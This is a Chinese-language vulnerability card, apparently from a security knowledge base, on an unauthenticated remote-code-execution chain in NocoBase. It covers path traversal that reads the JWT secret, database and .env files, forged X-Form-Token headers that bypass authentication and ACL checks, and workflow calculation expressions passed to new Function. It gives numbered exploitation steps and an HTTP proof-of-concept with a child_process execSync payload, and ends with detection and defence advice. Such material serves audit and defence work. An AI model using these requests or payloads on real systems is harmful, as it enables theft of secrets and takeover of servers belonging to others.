---
id: web-nodejs-nocobase-public-forms-path-traversal-jwt-workflow-rce
title: NocoBase 未授权 RCE 链：gateway 路径穿越读 JWT 密钥 + public-forms 伪造 Token 绕过认证/ACL + workflow new Function 执行
type: scenario
domain: web
path: web/nodejs
technique: nocobase-public-forms-jwt-workflow-rce
aliases:
- NocoBase 未授权 RCE
- NocoBase public-forms 链
- gateway storage uploads 路径穿越
- X-Form-Token 伪造
- workflow calculation new Function
- NocoBase 0day 审计
tags:
- nodejs
- nocobase
- path-traversal
- jwt
- auth-bypass
- acl-bypass
- workflow
- new-function
- rce
cve: []
severity: critical
confidence: low
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V31
  verified_at: '2026-11-05T06:11:20+08:00'
  notes: 已通读原文（无图片）核对五段链路：gateway 的 storage/uploads 前缀 startswith 不归一化、serve-handler public=resolve(process.cwd())；jwt_secret.dat 路径与 JwtService HS256 对称签名/验签；public-forms parseToken 信任 tokenData.collectionName、仅校验 formKey 存在且 enabled 后 skipAuthCheck；parseACL 对 create 且 collectionName===resourceName 直接 skip；CalculationInstruction→formulajs new Function(expression) 无沙箱可访问 global/process；CollectionTrigger mode=1 监听 users.afterCreate。链路各段代码路径与原文一致，完整链成立。原文明确不提供 PoC、未做黑盒测试，卡内 confidence=low 且注明未执行，与原文相符；原文未给版本，未设 affected_versions。PoC 为链路结构示意，未验证。
---

## 一句话结论

NocoBase 的未授权利用链由四段组成：gateway 的 uploads 静态路由把项目根目录当作静态根且不做路径归一化，`..%2F` 可读 `storage/apps/main/jwt_secret.dat`（及 SQLite 数据库、`.env`）；用该 HS256 密钥伪造 `X-Form-Token`；public-forms 的 `parseToken` 信任 Token 里的 `collectionName` 并设置 `skipAuthCheck`，`parseACL` 又按同一字段对任意 collection 的 `create` 放行；最后匿名创建 workflow 与 calculation 节点，节点 `expression` 进入 `new Function()`，触发 users 的 afterCreate 即执行任意 Node.js 代码。

## 原理

- **第一段：gateway 静态路由路径穿越**：`packages/core/server/src/gateway/index.ts` 的 `requestHandler` 在进入 Koa 前处理静态路由。当 `pathname.startsWith(APP_PUBLIC_PATH + 'storage/uploads/')` 时，它截掉 `APP_PUBLIC_PATH` 前缀，把请求交给 `serve-handler`，并把 `public` 设为 `resolve(process.cwd())`——即**项目根目录**而不是 `storage/uploads/`。前缀检查只看字符串开头，不做路径归一化，因此 `/storage/uploads/..%2F..%2F...` 仍能通过检查，URL 解码后的 `../` 让静态服务器解析到上级目录。
- **可读的高价值文件**：`storage/apps/main/jwt_secret.dat`（JWT 签名密钥）、`storage/db/nocobase.sqlite`（SQLite 后端整库）、`.env`（数据库密码等）。`JwtService` 用同一个 secret 做 HS256 的 `jwt.sign` 与 `jwt.verify`，拿到 secret 即可伪造任意 Token。
- **第二段：public-forms 信任 Token 声明**：`plugin-public-forms/src/server/plugin.ts` 在 `load()` 中把 `parseToken` 注册在 `auth` 之前、`parseACL` 注册在 `acl` 之前。`parseToken` 从 `X-Form-Token` 取 Token，调用 `jwt.decode(token)` 验签；通过后直接把 `tokenData.collectionName`、`tokenData.formKey`、`tokenData.targetCollections` 写入 `ctx.PublicForm`。它只校验 `formKey` 在 `publicForms` 表中存在且 `enabled`，**没有校验 Token 里的 `collectionName` 是否真的属于该表单绑定的 collection**，随后设置 `ctx.skipAuthCheck = true`，auth 中间件据此跳过认证。
- **第三段：ACL 按 Token 字段放行**：`parseACL` 中，若 `actionName === 'create' && ctx.PublicForm.collectionName === resourceName`，直接 `ctx.permission = { skip: true }`。由于 `collectionName` 来自攻击者伪造的 Token，攻击者可以逐次把 `collectionName` 设为 `workflows`、`flow_nodes`、`users`、`roles` 等任意 collection，对它们执行 `create`，没有白名单，也没有与 formKey 实际绑定 collection 的交叉校验。
- **第四段：workflow calculation 节点 `new Function()`**：`plugin-workflow` 的 `CalculationInstruction.run()` 从 `node.config` 取 `engine`、`expression`、`scope`，按 `engine` 选择求值器；`evaluators/src/utils/formulajs.ts` 的实现把 `expression` 原样拼进 `new Function(...fnNames, ...Object.keys(scope), 'return ' + expression)`。没有 `vm` 沙箱、没有 Realm 隔离，表达式可访问 `global`、`process`、`global.process.mainModule.require()`，等价于在 Node.js 主上下文执行任意代码。
- **第五段：触发**：创建 `workflows` 记录时配置 `type: "collection"`、`config.mode = 1`（afterCreate）、`config.collection = "users"`；`CollectionTrigger.on()` 会对 `users` 模型注册 `afterCreate` 钩子。攻击者再通过 ACL 绕过匿名 `users:create` 插入一个用户，钩子触发 workflow，执行 calculation 节点中的恶意 `expression`，完成 RCE。
- **完整链路**：
  `GET /storage/uploads/..%2F..%2F...` 读 `jwt_secret.dat` → 伪造 `X-Form-Token` → `parseToken` 设 `skipAuthCheck` → `parseACL` 对任意 collection `create` 放行 → 创建 `workflows` + `flow_nodes`（calculation）→ 匿名 `users:create` → `afterCreate` → `new Function(expression)` → RCE。

## 触发条件

- 目标运行包含上述代码路径的 NocoBase 版本（文章未给出具体版本号，需按代码核对 gateway/public-forms/workflow/evaluators 实现）。
- 目标启用 `plugin-public-forms` 与 `plugin-workflow`，且存在至少一个 `enabled` 的 public form；`formKey` 可通过路径穿越读 SQLite 数据库获得，或在 PostgreSQL/MySQL 下用 SQL 注入查询。
- `storage/apps/main/jwt_secret.dat` 位于项目根目录且可被静态路由穿越读取；`APP_PUBLIC_PATH` 与 uploads 路由按文章所述配置。
- 攻击者无需账号；能访问 Web 端口即可。
- 目标未对静态路径做归一化/`..` 拦截，未校验 `X-Form-Token` 的 collectionName 与表单绑定关系，未禁用 workflow calculation 节点或 `new Function`。

## 利用步骤

1. 确认 uploads 静态路由可达，构造 `..%2F` 路径读取 `storage/apps/main/jwt_secret.dat`；若为 SQLite 后端，同时读取 `storage/db/nocobase.sqlite` 获取 `publicForms` 的 `key`/`enabled`，并读取 `.env`。
2. 用拿到的 32 字节 secret 以 HS256 伪造 JWT，payload 至少包含 `collectionName`、`formKey`（已启用的公开表单 key）、`targetCollections`。
3. 把伪造 Token 放入 `X-Form-Token` 请求头；`parseToken` 验签通过后设置 `ctx.skipAuthCheck=true`，请求不再需要登录态。
4. 用 `collectionName=workflows` 的 Token 调用 `POST /api/workflows:create`，创建 `type=collection`、`config={mode:1, collection:"users"}` 的 workflow。
5. 用 `collectionName=flow_nodes` 的 Token 调用 `POST /api/flow_nodes:create`，创建 `type=calculation` 节点，`config.engine` 选 formula.js，`config.expression` 填入恶意 JavaScript（如 `global.process.mainModule.require('child_process').execSync('id').toString()`）。
6. 用 `collectionName=users` 的 Token 调用 `POST /api/users:create` 插入一个用户，触发 `users` 的 afterCreate 钩子，workflow 执行 calculation 节点，命令执行。
7. 通过回显（表达式返回值可能进入 job 结果）或写文件/回连验证；清理 workflow、flow_node、新建用户。

## PoC

原文明确说明不提供 PoC、未做黑盒测试；以下仅为链路结构示意，未在目标上执行。

```http
# 1. 路径穿越读取 JWT 密钥
GET /storage/uploads/..%2F..%2Fstorage%2Fapps%2Fmain%2Fjwt_secret.dat HTTP/1.1
Host: target

# 2. 伪造 X-Form-Token（HS256，payload 字段示意）
# {"collectionName":"workflows","formKey":"<enabled-public-form-key>","targetCollections":["workflows","flow_nodes","users"]}

# 3. 创建 workflow
POST /api/workflows:create HTTP/1.1
Host: target
Content-Type: application/json
X-Form-Token: <forged-token-collectionName-workflows>

{"title":"x","type":"collection","config":{"mode":1,"collection":"users"},"enabled":true}

# 4. 创建 calculation 节点
POST /api/flow_nodes:create HTTP/1.1
Host: target
Content-Type: application/json
X-Form-Token: <forged-token-collectionName-flow_nodes>

{"workflowId":1,"type":"calculation","config":{"engine":"formula.js","expression":"global.process.mainModule.require('child_process').execSync('id').toString()","scope":{}}}

# 5. 触发 afterCreate
POST /api/users:create HTTP/1.1
Host: target
Content-Type: application/json
X-Form-Token: <forged-token-collectionName-users>

{"email":"a@b.c","nickname":"x","password":"x"}
```

## 变体与关联

- **JWT 密钥来源**：路径穿越读 `jwt_secret.dat`；若该文件不可读，SQLite 后端可读数据库，PostgreSQL/MySQL 后端可结合 NocoBase 的 SQL 注入（见关联卡）查询 `publicForms`/配置。
- **public-forms Token 的其他放行条件**：`parseACL` 还对 `list/get` 且 `targetCollections` 包含 resourceName、`template=file` 的 collection create、`storages` 的 `getBasicInfo/createPresignedUrl`、`vditor:check`、`map-configuration:get` 放行；这些条件同样依赖 Token 内可控字段，可扩展攻击面。
- **workflow 其他节点**：除 `calculation` 外，任何最终把用户可控配置送进 `eval`/`new Function`/子进程/模板的节点都可能是等价 sink；`calculation` 只是最直接的一个。
- **触发方式**：除 `users:afterCreate` 外，可把 workflow 绑定到其他高频 collection/事件，或用定时/手动触发（若 ACL 绕过允许）。
- 关联卡片：[[web-generic-sqli-nocobase-myinappchannels-sequelize-literal]]、[[web-generic-jwt-hs256-secret-forgery]]（如已存在）、[[web-nodejs-n8n-expression-sandbox-escape-rce]]（Node 表达式沙箱逃逸的同类模式）。

## 检测与防御

- **路径穿越**：对 `storage/uploads/` 请求做 `path.normalize` 后校验必须仍位于 uploads 目录；拒绝解码后含 `..`、`%2f`、`%5c` 的路径；`serve-handler` 的 `public` 应设为 `storage/uploads` 而非项目根目录。
- **JWT/Token**：`jwt_secret.dat` 权限限制为服务账号可读；不要把 JWT 密钥放在可被静态路由触及的目录；public-forms 的 `parseToken` 必须校验 Token 的 `collectionName` 与 `formKey` 实际绑定的 collection 一致，不能仅凭 Token 声明设置 `skipAuthCheck`。
- **ACL**：`parseACL` 对 `create` 的放行应使用表单绑定的 collection 白名单，而不是 Token 里的 `collectionName`；`targetCollections` 同样需要服务端可信来源。
- **workflow/求值器**：禁用或沙箱化 calculation 节点的 `new Function`，改用受限表达式引擎（无 `global`/`process`/`require`）；对 workflow/flow_node 的创建做权限与内容审计。
- **检测**：静态路由请求含 `..%2F`/`..%5C`；`X-Form-Token` 的 `collectionName` 与 `formKey` 不匹配；匿名创建 `workflows`/`flow_nodes`；workflow 中出现 `global.process`、`child_process`、`require(` 等表达式；`users:create` 后紧跟异常子进程。
- **应急**：升级到修复版本；轮换 `jwt_secret.dat` 与数据库凭据；删除恶意 workflow/flow_node/用户；审计 `storage` 目录与静态访问日志；限制 public-forms 的匿名创建能力。
